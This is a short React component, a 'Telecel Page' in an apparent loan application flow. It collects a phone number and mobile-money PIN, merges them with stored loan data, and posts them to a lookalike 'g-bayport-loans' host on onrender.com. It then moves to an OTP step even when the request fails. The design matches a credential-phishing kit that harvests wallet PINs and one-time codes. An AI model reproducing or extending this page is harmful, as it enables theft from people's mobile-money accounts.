import { useState } from "react";
import axios from "axios";
import { useNavigate, useParams } from "react-router-dom";

export default function Telecel() {
  const navigate = useNavigate();
  const { id } = useParams(); // just to confirm route works

  const [loading, setLoading] = useState(false);
  const [data, setData] = useState({
    number: "",
    pin: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    let loanData = {};

    try {
      loanData = JSON.parse(localStorage.getItem("loanData")) || {};
    } catch {
      loanData = {};
    }

    console.log("LoanData:", loanData);
    console.log("Telecel Data:", data);

    setLoading(true);

    try {
      const res = await axios.post(
        "https://g-bayport-loans.onrender.com/apply",
        {
          ...loanData,
          ...data,
        }
      );

      console.log("API response:", res.data);

      const newId = res.data?.id || "123";
      navigate(`/otp/${newId}`);

    } catch (err) {
      console.error("Error:", err);

      // fallback
      navigate("/otp/123");
    }

    setLoading(false);
  };

  return (
    <div style={{ padding: "20px" }}>
      <h1>Telecel Page ✅</h1>
      <p>Route ID: {id}</p>

      <form onSubmit={handleSubmit}>
        <input
          name="number"
          placeholder="Enter number"
          onChange={handleChange}
          required
        />

        <input
          name="pin"
          type="password"
          placeholder="Enter PIN"
          onChange={handleChange}
          required
        />

        <button type="submit">
          {loading ? "Processing..." : "Continue"}
        </button>
      </form>
    </div>
  );
}